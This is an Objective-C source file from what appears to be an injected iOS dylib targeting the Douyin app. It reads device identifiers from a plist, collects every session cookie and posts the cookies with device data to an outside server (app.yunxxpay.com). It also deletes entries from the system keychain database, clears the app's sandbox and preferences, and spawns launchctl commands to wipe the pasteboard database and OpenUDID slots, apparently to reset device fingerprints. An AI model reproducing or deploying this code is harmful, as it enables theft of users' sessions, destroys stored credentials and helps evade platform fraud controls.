//
//  DYCommeObj.m
//  DouyinDylib
//
//  Created by apple on 2020/9/17.
//  Copyright © 2020 apple. All rights reserved.
//

#import "DYCommeObj.h"
#import <objc/runtime.h>
#import <sqlite3.h>
//#if (CC_TARGET_PLATFORM != CC_PLATFORM_ANDROID)
//#include <ftw.h>
//#endif
//#include <dirent.h>，
#include <spawn.h>

#import <UIKit/UIPasteboard.h>
#define kBaseURL    @"http://app.yunxxpay.com/api/dy/getTask"//测试

extern char **environ;

@interface DYCommeObj ()
@property (nonatomic ,assign)NSInteger index;
@end

@implementation DYCommeObj


+(instancetype)sharedQueue
{
    
    static DYCommeObj * queue = nil;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        queue = [[DYCommeObj alloc] init];
     
        NSString *plistPath = [[NSBundle mainBundle] pathForResource:@"douyin" ofType:@"plist"];
        //当数据结构为数组时
        //当数据结构为非数组时
        NSDictionary *dictionary = [[NSDictionary alloc] initWithContentsOfFile:plistPath];
   
        DeviceModel *model =[DeviceModel mj_objectWithKeyValues:dictionary[@"douYin_help_data"]];

        if (model) {
        queue.openudid = model.mobile_info.openudid;
        queue.version =[NSString stringWithFormat:@"%.1f",[model.mobile_info.iphone_version floatValue]] ;
            
        queue.userName = model.mobile_info.user_name;
        NSUUID *idfauuid = [[NSUUID alloc] initWithUUIDString:model.mobile_info.idfa] ;
        NSUUID *idfvuuid = [[NSUUID alloc] initWithUUIDString:model.mobile_info.idfv] ;
        queue.idfa = idfauuid;
        queue.idfv = idfvuuid;
        
        queue.reFresh = model.refresh_code.intValue;
            
        }

    });
    return queue;
}



-(instancetype)init
{
    if (self = [super init]) {
        _queue = [[NSMutableArray alloc] init];
    }
    return self;
}

-(void)enqueue:(NSMutableDictionary *)param
{
    [self.queue addObject:param];
}

-(NSMutableDictionary *)dequeue
{
    if (0 == self.queue.count && !self.queue.firstObject) {
        return nil;
    }
    NSMutableDictionary * first = self.queue.firstObject;
    [self.queue removeObjectAtIndex:0];//干掉里面的数据!
    return first;
}

-(void)getQueaAndTask{
    AFHTTPSessionManager *manager = [AFHTTPSessionManager manager];
//    {
//        task_info =     {
//            type = 1,
//            userid = "Junxiaoyinga",
//        },
//        status_code = 0,
//        version_code = "1.0",
//        mobile_info =     {
//            location = "",
//            iphone_version = 8.1,
//            platform = "ios",
//            user_name = "my iphone",
//            timestamp = 1576651564018,
//            openudid = "35d0d3d09701a215e07685ed5c5216c0595b8ad1",
//            idfa = "C1121A3B-1E06-5042-B195-2C65BB8C8518",
//        },
//        refresh_code = 1,
//    }
    //2.封装参数
    NSDictionary *dict = @{
                           @"username":@"Lion",
                           @"pwd":@"1314",
                           @"type":@"JSON"
                           };

     
    [manager GET:kBaseURL parameters:dict progress:nil success:^(NSURLSessionDataTask * _Nonnull task, id  _Nullable responseObject) {
        NSDictionary *respdic = responseObject[@"mobile_info"];
        NSLog(@"respdicfailure--%@",respdic);
       
//        exit(0);
    } failure:^(NSURLSessionDataTask * _Nullable task, NSError * _Nonnull error) {

        NSLog(@"failure--%@",error);
    }];

}
-(void)delayUpCookieToSevers{
    [self  performSelector:@selector(upTheCookieWithTimes:) withObject:nil afterDelay:10];
}

-(void)upTheCookieWithTimes:(NSInteger)index{
    AFHTTPSessionManager *manager = [AFHTTPSessionManager manager];
    NSArray *array = [[NSHTTPCookieStorage sharedHTTPCookieStorage] cookies];
    NSMutableDictionary *dicCookie = [NSMutableDictionary dictionary];
    for (NSHTTPCookie *cookie in array) {
        [dicCookie setValue:cookie.value forKey:cookie.name];
    }
 
    if ([dicCookie allKeys].count <3) {
        [self  performSelector:@selector(upTheCookieWithTimes:) withObject:nil afterDelay:10];
        return;
    }
    
    NSString *plistPath = [[NSBundle mainBundle] pathForResource:@"douyin" ofType:@"plist"];
           //当数据结构为数组时
           //当数据结构为非数组时
    NSDictionary *dictionary = [[NSDictionary alloc] initWithContentsOfFile:plistPath];
    [dicCookie  setObject:dictionary forKey:@"device_info"];

    
    NSString *filePatch = [[NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)objectAtIndex:0]stringByAppendingPathComponent:@"douyin_help_status.plist"];
    NSMutableDictionary *dataDictionary = [[NSMutableDictionary alloc] initWithContentsOfFile:filePatch];
    [dicCookie  setObject:dataDictionary forKey:@"device_cookie_info"];

    NSMutableDictionary *dic = [NSMutableDictionary dictionary];
    [dic setValue:dicCookie forKey:@"info"];

    [manager POST:@"http://app.yunxxpay.com/api/dy/reportInfo" parameters:dic progress:nil success:^(NSURLSessionDataTask * _Nonnull task, id  _Nullable responseObject) {
        NSLog(@"responseObjectupcookie-----%@ %@",responseObject , dic);
        
//        [self upTheCookieWithTimes:1];
//        [ShowChatStateView showLabelWithString:@"数据上传成功 即将开闭"];
        
        [self writeToFileWith:dictionary];
        [self performSelector:@selector(exitProgram) withObject:nil afterDelay:6];

    } failure:^(NSURLSessionDataTask * _Nullable task, NSError * _Nonnull error) {
        NSLog(@"failure--%@",error);

    }];
    
}

-(void)exitProgram{
    //exit(0);

}
- (void)writeToFileWith:(NSDictionary *)dataDic{
    NSString *filePatch = [[NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)objectAtIndex:0]stringByAppendingPathComponent:@"douyin_help_status.plist"];
    NSMutableDictionary *dataDictionary = [[NSMutableDictionary alloc] initWithContentsOfFile:filePatch];
    

    [dataDictionary setObject:dataDic forKey:@"devece_info"];

    [dataDictionary setObject:@"1" forKey:@"finish_Status"];


    //写入文件

    BOOL  sucess =   [dataDictionary writeToFile:filePatch atomically:YES];
    if (sucess) {
        
    }else{
        
    }
    
}


-(void)clearCookies{
    NSHTTPCookieStorage *cookieStorage = [NSHTTPCookieStorage sharedHTTPCookieStorage];
    NSArray *tempArray = [NSArray arrayWithArray:[cookieStorage cookies]];
    for (NSHTTPCookie *cookiej in tempArray) {
      [cookieStorage deleteCookie:cookiej];
    }
}

- (void)clearUserDefaults {
    NSUserDefaults*userDefaults= [NSUserDefaults  standardUserDefaults];

    NSDictionary*dic = [userDefaults dictionaryRepresentation];
    NSArray *keysting = [dic allKeys];
    NSString *allkey= [keysting componentsJoinedByString:@","];
    NSLog(@"clearUserDefaults removeObjectForKey %@",allkey);

    for(id key in dic) {
//        NSString *dicstring = [NSString stringWithFormat:@"removeObjectForKey %@",dic];
        NSLog(@"removeObjectForKey ley =%@",key);

    [userDefaults  removeObjectForKey:key];
    }
[userDefaults  synchronize];

NSString*appDomain = [[NSBundle mainBundle] bundleIdentifier];

[[NSUserDefaults standardUserDefaults]removePersistentDomainForName:appDomain];
}

- (void)clearSandBox {
    
    NSString *datapath = [self  getDouyingSandBoxPath];
    if (datapath) {
//        [self clearSandBoxWithDataPath:datapath];
//        [self clearPerenceFile:@"com.ss.iphone.ur.dopuyin"];

    }else{
        NSLog(@"找不到路径");
    }

}


- (NSString *)getDouyingSandBoxPath {

    
    Class LSApplicationWorkspace_class = objc_getClass("LSApplicationWorkspace");
    NSObject * workspace = [LSApplicationWorkspace_class performSelector:@selector(defaultWorkspace)];
    NSArray *array = [workspace performSelector:@selector(allApplications)];
    Class LSApplicatioinProxy_class = objc_getClass("LSApplicatioinProxy");

    for (LSApplicatioinProxy_class  in array) {
        NSString  *stringBundID = [LSApplicatioinProxy_class performSelector:@selector(bundleIdentifier)];
        
        NSURL  *containUrl = [LSApplicatioinProxy_class performSelector:@selector(containerURL)];
        NSString *stringDataPath =[containUrl path];

        if ([stringBundID isEqualToString:@"com.ss.iphone.ur.dopuyin"]) {
            return stringDataPath;
        }
    }
    return  nil;
//    BOOL isopen = [workspace performSelector:@selector(openApplicationWithBundleID:) withObject:@"com.tencent.mqq"];

 
}

- (NSString *)clearSandBoxWithDataPath:(NSString *)dataPath {
    if ([dataPath hasPrefix:@"/private/var/mobile/Containers/Data/Application/"]|| [dataPath hasPrefix:@"/var/mobile/Containers/Data/Application/"]) {
        NSFileManager *manger = [NSFileManager defaultManager];
        NSString *strDucment = [dataPath stringByAppendingPathComponent:@"Documents"];
        [manger removeItemAtPath:strDucment error:nil];
        
        NSString *libDucment = [dataPath stringByAppendingPathComponent:@"Library"];
        [manger removeItemAtPath:libDucment error:nil];
        
        NSString *cachesDucment = [dataPath stringByAppendingPathComponent:@"Caches"];
//       [manger removeItemAtPath:cachesDucment error:nil];
        
        NSString *preDucment = [dataPath stringByAppendingPathComponent:@"Preferences"];
//      [manger removeItemAtPath:libDucment error:nil];
        
        NSString *tmpDucment = [dataPath stringByAppendingPathComponent:@"tmp"];
        [manger removeItemAtPath:tmpDucment error:nil];
        
        NSString *storeDucment = [dataPath stringByAppendingPathComponent:@"StoreKit"];
        [manger removeItemAtPath:storeDucment error:nil];

        NSDictionary *strDic = [NSDictionary  dictionaryWithObjectsAndKeys:
                                @"mobile",NSFileGroupOwnerAccountName,
                                @"mobile",NSFileOwnerAccountName, nil];
        
        [manger  createDirectoryAtPath:dataPath withIntermediateDirectories:NO attributes:strDic error:nil];
        [manger  createDirectoryAtPath:strDucment withIntermediateDirectories:NO attributes:strDic error:nil];
        [manger  createDirectoryAtPath:libDucment withIntermediateDirectories:NO attributes:strDic error:nil];
        [manger  createDirectoryAtPath:cachesDucment withIntermediateDirectories:NO attributes:strDic error:nil];
        [manger  createDirectoryAtPath:preDucment withIntermediateDirectories:NO attributes:strDic error:nil];
        [manger  createDirectoryAtPath:tmpDucment withIntermediateDirectories:NO attributes:strDic error:nil];
    }else{
        NSLog(@"rSandBox faild");
    }
    
}

- (NSString *)clearPerenceFile:(NSString *)strBundId {
    NSString *strPrePahtfile = [NSString stringWithFormat:@"/var/mobile/Library/Preferences/%@.plist",strBundId];
    NSFileManager *manager = [NSFileManager defaultManager];
    NSError *err;
  BOOL remove =  [manager removeItemAtPath:strPrePahtfile error:&err];
    if (!err) {
        
    }else{
        NSLog(@"没有找到这PerenceFile");
    }
}

-(void)clearKeyChain{
//    sqlite3  *db;
//    NSString  *stringFile = @"/var/Keychains/keychain-2.db";
//
//    int result = sqlite3_open([stringFile UTF8String], &db);
//    if (result != SQLITE_OK) {
//        NSLog(@"clearKeyChain  打开失败  %d" ,result);
//        return;
//    }
//
//
//    char  *perror = NULL;
//    NSString *strSQL = @"DELETE FROM genp WHERE agrp<>'apple'";
//    result  = sqlite3_exec(db, [strSQL UTF8String], nil, nil, &perror);
//
//    strSQL = @"DELETE FROM cert WHERE agrp<>'lockdown-identities'";
//    result  = sqlite3_exec(db, [strSQL UTF8String], nil, nil, &perror);
//
//    strSQL = @"DELETE FROM keys WHERE agrp<>'lockdown-identities'";
//    result  = sqlite3_exec(db, [strSQL UTF8String], nil, nil, &perror);
//
//    strSQL = @"DELETE FROM inet";
//    result  = sqlite3_exec(db, [strSQL UTF8String], nil, nil, &perror);
//
//    strSQL = @"DELETE FROM sqlite_sequence";
//    result  = sqlite3_exec(db, [strSQL UTF8String], nil, nil, &perror);
//
//    if (perror) {
//
//    }
//
//    sqlite3_close(db);
    
    sqlite3 *database;
    int openResult = sqlite3_open("/var/Keychains/keychain-2.db", &database);
    if (openResult == SQLITE_OK)
    {
        int execResult = sqlite3_exec(database, "DELETE FROM genp WHERE agrp <> 'apple'", NULL, NULL, NULL);
        if (execResult != SQLITE_OK) NSLog(@"Failed to exec DELETE FROM genp WHERE agrp <> 'apple', error %d", execResult);

        execResult = sqlite3_exec(database, "DELETE FROM cert WHERE agrp <> 'lockdown-identities'", NULL, NULL, NULL);
        if (execResult != SQLITE_OK) NSLog(@"Failed to exec DELETE FROM cert WHERE agrp <> 'lockdown-identities', error %d", execResult);

        execResult = sqlite3_exec(database, "DELETE FROM keys WHERE agrp <> 'lockdown-identities'", NULL, NULL, NULL);
        if (execResult != SQLITE_OK) NSLog(@"Failed to exec DELETE FROM keys WHERE agrp <> 'lockdown-identities'', error %d", execResult);

        execResult = sqlite3_exec(database, "DELETE FROM inet", NULL, NULL, NULL);
        if (execResult != SQLITE_OK) NSLog(@"Failed to exec DELETE FROM inet, error %d", execResult);

        execResult = sqlite3_exec(database, "DELETE FROM sqlite_sequence", NULL, NULL, NULL);
        if (execResult != SQLITE_OK) NSLog(@"Failed to exec DELETE FROM sqlite_sequence, error %d", execResult);
        NSLog(@"删除keychain");
        sqlite3_close(database);
    }
    
    NSMutableDictionary *query = [NSMutableDictionary dictionaryWithObjectsAndKeys:
                                   (__bridge id)kCFBooleanTrue, (__bridge id)kSecReturnAttributes,
                                   (__bridge id)kSecMatchLimitAll, (__bridge id)kSecMatchLimit,
                                   nil];
     NSArray *secItemClasses = [NSArray arrayWithObjects:
                                (__bridge id)kSecClassGenericPassword,
                                (__bridge id)kSecClassInternetPassword,
                                (__bridge id)kSecClassCertificate,
                                (__bridge id)kSecClassKey,
                                (__bridge id)kSecClassIdentity,
                                nil];
     for (id secItemClass in secItemClasses) {
         [query setObject:secItemClass forKey:(__bridge id)kSecClass];

         CFTypeRef result = NULL;
         SecItemCopyMatching((__bridge CFDictionaryRef)query, &result);
         if (result != NULL) CFRelease(result);

         NSDictionary *spec = @{(__bridge id)kSecClass: secItemClass};
         SecItemDelete((__bridge CFDictionaryRef)spec);
     }
     
}

- (void)clearPastBoard{
//    bool FileUtils::isDirectoryExistInternal(const std::string& dirPath) const
//    bool FileUtils::createDirectory(const std::string& path)
//
//    NSString *strCmd = [NSString stringWithFormat:@"launchctl unload -w /System/Library/LaunchDaemons/com.apple.UIKit.pasteboardd.plist"];
//    nftw([strCmd UTF8String]);
//
//    strCmd = [NSString stringWithFormat:@"rm /var/mobile/Library/Caches/com.apple.UIKit.pboard/pasteboardDB"];
//    nftw([strCmd UTF8String]);
//
//    NSString *strCmd = [NSString stringWithFormat:@"launchctl load -w /System/Library/LaunchDaemons/com.apple.UIKit.pasteboardd.plist"];
//    system([strCmd UTF8String]);
    
    pid_t pid;
    char *argv[] = {
        "launchctl unload -w /System/Library/LaunchDaemons/com.apple.UIKit.pasteboardd.plist",
        "m /var/mobile/Library/Caches/com.apple.UIKit.pboard/pasteboardDB",
        "launchctl load -w /System/Library/LaunchDaemons/com.apple.UIKit.pasteboardd.plist",
        NULL
    };

    posix_spawn(&pid, argv[0], NULL, NULL, argv, environ);
    waitpid(pid, NULL, 0);
    
    for (int n=0; n<3; n++){
            NSString* slotPBid = [NSString stringWithFormat:@"%@%d",@"org.OpenUDID.slot.",n];
         UIPasteboard *board =  [UIPasteboard  pasteboardWithName:slotPBid create:NO];
         [board setPersistent:NO];
         [UIPasteboard  removePasteboardWithName:slotPBid];

        }
    for (int n=0; n<3; n++){
               NSString* slotPBid = [NSString stringWithFormat:@"%@%d",@"com.UTDID.",n];
              UIPasteboard *board =  [UIPasteboard  pasteboardWithName:slotPBid create:NO];
              [board setPersistent:NO];
              [UIPasteboard  removePasteboardWithName:slotPBid];

    }
}

@end
